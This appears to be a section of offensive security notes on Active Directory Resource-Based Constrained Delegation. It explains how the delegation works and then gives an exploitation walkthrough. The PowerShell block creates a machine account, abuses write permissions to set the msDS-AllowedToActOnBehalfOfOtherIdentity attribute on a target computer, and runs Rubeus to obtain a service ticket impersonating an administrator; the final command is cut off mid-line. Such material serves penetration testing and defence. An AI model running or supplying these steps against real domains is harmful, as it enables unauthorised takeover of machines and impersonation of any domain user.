Resource-Based Constrained Delegation (RBCD) configures the _backend server_ (e.g. MSSQL) to allow _only selected frontend services_ (e.g. IIS) to delegate on behalf of the user. This makes it easier for specific server administrators to configure delegation, without requiring domain admin privileges.

DACL Property: `msDS-AllowedToActOnBehalfOfOtherIdentity`.

In this scenario, `s4u2self` and `s4u2proxy` are used as above to request a forwardable ticket on behalf of the user. However, with RBCD, the KDC checks if the SPN for the requesting service (i.e., the _frontend service_) is present in the `msDS-AllowedToActOnBehalfOfOtherIdentity` property of the _backend service_. This means that the _frontend service_ needs to have an SPN set. Thus, attacks against RBCD have to be performed from either a service account with SPN or a machine account.

#### Exploitation

If we compromise a _frontend service_ that appears in the RBCD property of a _backend service_, exploitation is the same as with constrained delegation above. This is however not too common.

A more often-seen attack to RBCD is when we have `GenericWrite`, `GenericAll`, `WriteProperty`, or `WriteDACL` permissions to a computer object in the domain. This means we can write the `msDS-AllowedToActOnBehalfOfOtherIdentity` property on this machine account to add a controlled SPN or machine account to be trusted for delegation. We can even create a new machine account and add it. This allows us to compromise the target machine in the context of any user, as with constrained delegation.

```powershell
# Create a new machine account using PowerMad
New-MachineAccount -MachineAccount NewMachine -Password $(ConvertTo-SecureString 'P4ssword123!' -AsPlainText -Force)

# Get SID of our machine account and bake raw security descriptor for msDS-AllowedtoActOnBehalfOfOtherIdentity property on target
$sid = Get-DomainComputer -Identity NewMachine -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)

# Use PowerView to use our GenericWrite (or similar) priv to apply this SD to the target
Get-DomainComputer -Identity TargetSrv | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Finally, use Rubeus to exploit RBCD to get a TGS as admin on the target
.\Rubeus.exe s4u /user:NewMachine$ /rc4:A9A70FD4DF48FBFAB37E257CFA953312 /impersonateuser
```